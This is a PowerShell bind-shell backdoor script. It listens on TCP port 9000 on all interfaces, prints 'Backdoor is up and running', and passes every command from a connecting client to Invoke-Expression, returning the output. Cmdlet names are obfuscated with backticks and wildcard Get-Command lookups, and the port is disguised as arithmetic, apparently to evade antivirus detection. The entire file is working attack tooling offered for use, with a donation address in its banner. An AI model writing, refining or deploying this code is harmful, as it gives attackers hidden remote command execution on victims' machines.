# change the port number as necessary
# obfuscated port number, same as $p = 9000;
$p = 1000 + 1000 + 1000 + 6000;
& (`G`C`M *e-Ho??) "#######################################################################";
& (`G`C`M *e-Ho??) "#                                                                     #";
& (`G`C`M *e-Ho??) "#                         PowerShell Bind TCP v1.1                    #";
& (`G`C`M *e-Ho??) "#                                        by Ivan Sincek               #";
& (`G`C`M *e-Ho??) "#                                                                     #";
& (`G`C`M *e-Ho??) "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp. #";
& (`G`C`M *e-Ho??) "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.  #";
& (`G`C`M *e-Ho??) "#                                                                     #";
& (`G`C`M *e-Ho??) "#######################################################################";
$l = $null;
$c = $null;
$t = $null;
$b = $null;
$w = $null;
$d = $null;
$r = $null;
try {
	$l = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `N`E`T`.`S`O`C`K`E`T`S`.`T`C`P`L`I`S`T`E`N`E`R("0.0.0.0", $p)');
	$l.Start();
	& (`G`C`M *e-Ho??) "Backdoor is up and running...";
	& (`G`C`M *e-Ho??) "";
	& (`G`C`M *e-Ho??) "Waiting for client to connect...";
	& (`G`C`M *e-Ho??) "";
	do {
		# non-blocking method
		if ($l.Pending()) {
			$c = $l."`A`C`C`E`P`T`T`C`P`C`L`I`E`N`T"();
		} else {
			& (`G`C`M *t-Sl*) -Milliseconds 500;
		}
	} while ($c -eq $null);
	$l.Stop();
	$t = $c.GetStream();
	$b = & (`G`C`M *ew-O*) Byte[] (1000 + 12 + 12);
	$e = & (`G`C`M *ew-O*) Text.AsciiEncoding;
	$w = (& (`G`C`M *ke-E*) '& (`G`C`M *ew-O*) `I`O`.`S`T`R`E`A`M`W`R`I`T`E`R($t)');
	$w.AutoFlush = $true;
	& (`G`C`M *e-Ho??) "Client connected!";
	$by = 0;
	do {
		$w.Write("PS>");
		do {
			$by = $t.Read($b, 0, $b.Length);
			if ($by -gt 0) {
				$d = $d + $e.GetString($b, 0, $by);
			}
		} while ($t.DataAvailable);
		if ($d.Length -gt 0) {
			try {
				$r = & (`G`C`M *ke-E*) -Command $d 2>&1 | & (`G`C`M *ut-S?????);
			} catch {
				$r = $_.Exception;
			}
			$w.WriteLine($r);
			& (`G`C`M *r-Va*) -Name "d";
		}
	} while ($by -gt 0);
} catch {
	& (`G`C`M *e-Ho??) $_.Exception;
} finally {
	if ($l -ne $null) {
		$l.Server.Close();
		$l.Server.Dispose();
	}
	if ($w -ne $null) {
		$w.Close();
		$w.Dispose();
	}
	if ($t -ne $null) {
		$t.Close();
		$t.Dispose();
	}
	if ($c -ne $null) {
		$c.Close();
		$c.Dispose();
	}
	if ($b -ne $null) {
		$b.Clear();
	}
	if ($d -ne $null) {
		& (`G`C`M *r-Va*) -Name "d";
	}
	if ($r -ne $null) {
		& (`G`C`M *r-Va*) -Name "r";
	}
}
